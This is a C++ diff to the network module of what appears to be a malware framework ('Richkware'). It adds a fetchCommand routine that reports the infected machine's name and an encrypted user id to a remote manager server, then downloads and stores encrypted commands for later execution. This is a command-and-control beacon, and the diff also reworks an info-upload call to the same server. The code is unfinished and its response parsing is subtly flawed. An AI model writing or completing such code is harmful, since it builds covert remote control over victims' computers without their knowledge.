@@ -2,8 +2,9 @@
 *      Copyright 2016 Riccardo Melioli.
 */
 
-
 #include "network.h"
+#include "utils.h"
+#include "storage.h"
 
 Server::Server(std::string encryptionKeyArg) {
     encryptionKey = encryptionKeyArg;
@@ -154,9 +155,71 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
                                 "Connection: close\r\n" +
                                 "\r\n";
 
-    RawRequest(serverAddress, port, packet.c_str());
+    std::string response = RawRequest(serverAddress, port, packet.c_str());
+    if (response.find("OK") != std::string::npos) {     //the request was successful
+        return true;
+    }
+    return false;
+}
 
-    return true;
+//TODO: funzione di fetch dei comandi (dovrà poter esserre chiamata dal main indipendentemente dall'upload dei dati sul server)
+void
+Network::fetchCommand(const char *serverAddress, const char *port, const char *associatedUser, std::string appName) {
+    Crypto crypto(encryptionKey);
+    std::string device = getenv("COMPUTERNAME");
+    std::string encAssociatedUser = crypto.Encrypt(associatedUser);
+
+    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
+                         "&data1=" + encAssociatedUser +
+                         " HTTP/1.1\r\n" +
+                         "Host: " + serverAddress + "\r\n" +
+                         "Connection: close\r\n" +
+                         "\r\n";
+
+    std::string response = RawRequest(serverAddress, port,
+                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
+    /*
+     * JSON format returned by server:
+     * {
+     *     status: "OK",
+     *     statusCode: 1000,
+     *     message: {
+     *         commands: "[encrypted string]"
+     *     }
+     * }
+     *
+     * "encrypted string" is formatted as follows:
+     * "command1##command2##commandN"
+     * */
+    //parse message from server
+    if (response.find("OK") != std::string::npos) {
+        std::string delimiter = "\"message\":\"";
+        std::string delimiter2 = "\"";
+
+        size_t pos = 0;
+        std::string token;
+        pos = response.find(delimiter);
+        response.erase(0, pos + delimiter.length());
+
+        std::string token2;
+        pos = response.find(delimiter2);
+        token = response.substr(0, pos);
+        std::cout << token << std::endl;
+        response.erase(0, pos + delimiter.length());
+
+        SystemStorage storage = SystemStorage(appName);
+        storage.SaveValueToFile("commands.richk", response);
+    } else {
+        //TODO: manage KO from server
+    }
+
+//    std::vector<std::string> commands = utils::split(response, "##");
+//
+//    //save commands to file
+//    SystemStorage storage = SystemStorage(appName);
+//    for (size_t i = 0; i < commands.size(); ++i) {
+//        storage.SaveValueToFile("commands.richk")
+//    }
 }
 
 std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser) {
